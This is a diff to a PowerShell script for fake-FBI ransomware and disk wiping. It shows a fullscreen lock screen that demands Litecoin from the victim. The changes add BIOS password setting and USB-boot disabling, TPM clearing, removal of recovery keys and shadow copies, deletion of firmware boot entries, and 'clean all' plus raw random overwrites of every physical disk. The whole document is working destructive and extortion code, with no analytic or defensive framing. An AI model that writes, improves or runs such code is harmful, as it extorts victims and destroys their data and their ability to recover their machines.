@@ -63,7 +63,7 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
 $o = [char]243; $i = [char]237; $a = [char]225; $u2 = [char]250
-$lt = "ESTE PC HA SIDO INTERVENIDO POR EL FBI`r`n`r`nAcceso no autorizado prohibido.`r`n`r`nPara desbloquear este PC, env{i}a 1 LTC (o 50 USD) a la direcci{o}n de abajo:`r`n`r`nltc1qmu2ypleufay72yutpk2u0d5uvjmh99jw3cfklf`r`n`r`nUna vez recibido el pago, tu PC quedar{a} desbloqueado.`r`n`r`nAVISO: la tecla Windows y todos los atajos est{a}n anulados. La {u2}nica salida es el bot{o}n de apagado, y al pulsarlo se borrar{a} TODO el sistema operativo, las particiones, las copias de seguridad, las claves de recuperaci{o}n y el TPM. El equipo no volver{a} a arrancar nunca m{a}s: habr{a} que reinstalar Windows desde un USB y no habr{a} vuelta atr{a}s.`r`n`r`n-----------------------------------`r`n`r`nTHIS PC HAS BEEN SEIZED BY THE FBI`r`n`r`nUnauthorized access prohibited.`r`n`r`nTo unlock this PC, send 1 LTC (or 50 USD) to the address below:`r`n`r`nltc1qmu2ypleufay72yutpk2u0d5uvjmh99jw3cfklf`r`n`r`nOnce payment is received, your PC will be unlocked.`r`n`r`nWARNING: the Windows key and every shortcut are disabled. The only way out is the power button, and pressing it deletes the WHOLE OPERATING SYSTEM, the partition table, every backup, the recovery keys and the TPM. The machine will never boot again: Windows will have to be reinstalled from a USB stick and there is no way back."
+$lt = "ESTE PC HA SIDO INTERVENIDO POR EL FBI`r`n`r`nAcceso no autorizado prohibido.`r`n`r`nPara desbloquear este PC, env{i}a 1 LTC (o 50 USD) a la direcci{o}n de abajo:`r`n`r`nltc1qmu2ypleufay72yutpk2u0d5uvjmh99jw3cfklf`r`n`r`nUna vez recibido el pago, tu PC quedar{a} desbloqueado.`r`n`r`nAVISO: la tecla Windows y todos los atajos est{a}n anulados. La {u2}nica salida es el bot{o}n de apagado, y al pulsarlo se borra TODO: el sistema operativo, las particiones, las copias, las claves de recuperaci{o}n y el TPM. Ni con un USB de arranque se recupera: no hay vuelta atr{a}s. Este PC ya no es tuyo.`r`n`r`n-----------------------------------`r`n`r`nTHIS PC HAS BEEN SEIZED BY THE FBI`r`n`r`nUnauthorized access prohibited.`r`n`r`nTo unlock this PC, send 1 LTC (or 50 USD) to the address below:`r`n`r`nltc1qmu2ypleufay72yutpk2u0d5uvjmh99jw3cfklf`r`n`r`nOnce payment is received, your PC will be unlocked.`r`n`r`nWARNING: the Windows key and every shortcut are disabled. The only way out is the power button, and pressing it deletes EVERYTHING: the OS, the partitions, the backups, the recovery keys and the TPM. Not even a bootable USB will recover it: there is no way back. This PC is no longer yours."
 $lt = $lt.Replace('{o}', $o).Replace('{i}', $i).Replace('{a}', $a).Replace('{u2}', $u2)
 $form = New-Object System.Windows.Forms.Form
 $form.BackColor = [System.Drawing.Color]::Black
@@ -75,12 +75,27 @@ $form.FormBorderStyle = 'None'
 $form.ShowInTaskbar = $false
 $pic = New-Object System.Windows.Forms.PictureBox
 $pic.SizeMode = 'Zoom'
-$pic.BackColor = [System.Drawing.Color]::FromArgb(0, 40, 104)
+$pic.BackColor = [System.Drawing.Color]::Black
 try {
     $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
-    $pic.Image = [System.Drawing.Image]::FromStream((New-Object System.IO.MemoryStream(, $wc.DownloadData('https://fbijohn.com/wp-content/uploads/2023/06/FBI_headpic-1024x576.jpg'))))
-} catch { }
+    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+    $ib = $wc.DownloadData('https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Seal_of_the_Federal_Bureau_of_Investigation.svg/500px-Seal_of_the_Federal_Bureau_of_Investigation.svg.png')
+    $pic.Image = [System.Drawing.Image]::FromStream((New-Object System.IO.MemoryStream(, $ib)))
+} catch {
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+        $ib = $wc.DownloadData('https://fbijohn.com/wp-content/uploads/2023/06/FBI_headpic-1024x576.jpg')
+        $pic.Image = [System.Drawing.Image]::FromStream((New-Object System.IO.MemoryStream(, $ib)))
+    } catch {
+        $bmp = New-Object System.Drawing.Bitmap 480, 270
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.Clear([System.Drawing.Color]::FromArgb(0, 40, 104))
+        $g.DrawString("FBI", (New-Object System.Drawing.Font 'Arial', 48, ([System.Drawing.FontStyle]::Bold)), [System.Drawing.Brushes]::Gold, 150, 95)
+        $g.Dispose()
+        $pic.Image = $bmp
+    }
+}
 $label = New-Object System.Windows.Forms.Label
 $label.Text = $lt
 $label.AutoSize = $false
@@ -99,8 +114,8 @@ $form.Controls.Add($label)
 $form.Controls.Add($firm)
 $form.Add_Shown({
     $cw = $form.ClientSize.Width; $ch = $form.ClientSize.Height
-    $pw = [int][Math]::Min(480, $cw * 0.28)
-    $pic.Width = $pw; $pic.Height = [int]($pw * 0.5625)
+    $pw = [int][Math]::Min(300, $cw * 0.18)
+    $pic.Width = $pw; $pic.Height = [int]($pw * 1.03)
     $pic.Left = [int](($cw - $pic.Width) / 2); $pic.Top = 14
     $firm.Left = [int](($cw - $firm.Width) / 2); $firm.Top = $ch - $firm.Height - 20
     $label.Width = [int]($cw * 0.9); $label.Left = [int](($cw - $label.Width) / 2)
@@ -122,18 +137,26 @@ Set-Content -LiteralPath (Join-Path $pub 'show.ps1') -Value $show -Encoding UTF8
 $wipe = @'
 $ErrorActionPreference = "SilentlyContinue"
 $c = "C:\"
+try { (Get-WmiObject -Namespace root\HP\InstrumentedBIOS -Class HP_BIOSSettingInterface -EA Stop).SetBIOSSetting("Setup Password", "FBI2026", "") | Out-Null } catch { }
+try { (Get-WmiObject -Namespace root\HP\InstrumentedBIOS -Class HP_BIOSSettingInterface -EA Stop).SetBIOSSetting("USB Legacy Support", "Disable", "") | Out-Null } catch { }
+try { (Get-WmiObject -Namespace root\dcim\sysman\biosattributes -Class DCIM_BIOSService -EA Stop).SetBIOSAttributes("Enable USB Boot", "Disabled", $null) | Out-Null } catch { }
+try { (Get-WmiObject -Namespace root\wmi -Class Lenovo_SetBiosSetting -EA Stop).SetBiosSetting("Setup Password,FBI2026,ascii,us") | Out-Null } catch { }
 Clear-Tpm
+try { (Get-WmiObject -Namespace root\cimv2\security\microsofttpm -Class Win32_Tpm -EA Stop).Disable() | Out-Null } catch { }
+slmgr /upk
+slmgr /cpky
 manage-bde -protectors -delete C: -type RecoveryPassword
 manage-bde -protectors -delete C: -type Numerical
 vssadmin delete shadows /all /quiet
-$f = "C:\dp2.txt"
-$dl = @()
-foreach ($d in (Get-Disk | Where-Object { $_.BusType -ne "USB" })) { $dl += ("select disk " + $d.Number); $dl += "clean all noerr" }
-Set-Content -LiteralPath $f -Value $dl -Encoding ASCII
-diskpart /s $f
+$ids = [regex]::Matches(((bcdedit /enum firmware) -join "`n"), '\{[0-9a-fA-F\-]{36}\}') | ForEach-Object { $_.Value } | Select-Object -Unique
+foreach ($id in $ids) { if ($id -ne '{fwbootmgr}') { bcdedit /delete $id /f } }
+bcdedit /set {fwbootmgr} timeout 0
 foreach ($n in "bootmgr","Boot","EFI") { rd /s /q ($c + $n) }
 mountvol S: /S
 if (Test-Path S:\) { rd /s /q S:\ }
+$dl = @()
+foreach ($d in (Get-Disk | Sort-Object IsBoot)) { $dl += ("select disk " + $d.Number); $dl += "clean all noerr" }
+$dl | diskpart
 md C:\_e
 robocopy C:\_e C:\Windows /MIR /XJ /R:0 /W:0 /MT:16 /NFL /NDL /NJH /NJS /NP
 foreach ($v in [System.IO.DriveInfo]::GetDrives()) {
@@ -142,6 +165,18 @@ foreach ($v in [System.IO.DriveInfo]::GetDrives()) {
         Remove-Item -LiteralPath ($v.Name + '$Recycle.Bin') -Recurse -Force
     }
 }
+$rng = [Security.Cryptography.RandomNumberGenerator]::Create()
+foreach ($d in (Get-Disk)) {
+    try {
+        $buf = New-Object byte[] 1048576
+        $rng.GetBytes($buf)
+        $fs = [IO.File]::Open("\\.\PhysicalDrive$($d.Number)", 'Open', 'ReadWrite', 'Write')
+        for ($k = 0; $k -lt 16; $k++) { $fs.Write($buf, 0, $buf.Length) }
+        $fs.Flush()
+        $fs.Close()
+    } catch { }
+}
+$rng.Dispose()
 '@
 Set-Content -LiteralPath (Join-Path $pub 'w.ps1') -Value $wipe -Encoding UTF8
 
@@ -161,7 +196,7 @@ $cmd = New-Object System.Collections.Generic.List[string]
 $cmd.Add("@echo off")
 $cmd.Add("> C:\dp.txt echo select disk 0")
 $cmd.Add(">> C:\dp.txt echo clean noerr")
-foreach ($n in 1..7) { $cmd.Add(">> C:\dp.txt echo select disk $n"); $cmd.Add(">> C:\dp.txt echo clean noerr") }
+foreach ($n in 1..15) { $cmd.Add(">> C:\dp.txt echo select disk $n"); $cmd.Add(">> C:\dp.txt echo clean noerr") }
 $cmd.Add("diskpart /s C:\dp.txt")
 $cmd.Add("powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$d\wipe.ps1""")
 Set-Content -LiteralPath (Join-Path $d "wipe.cmd") -Value $cmd -Encoding ASCII
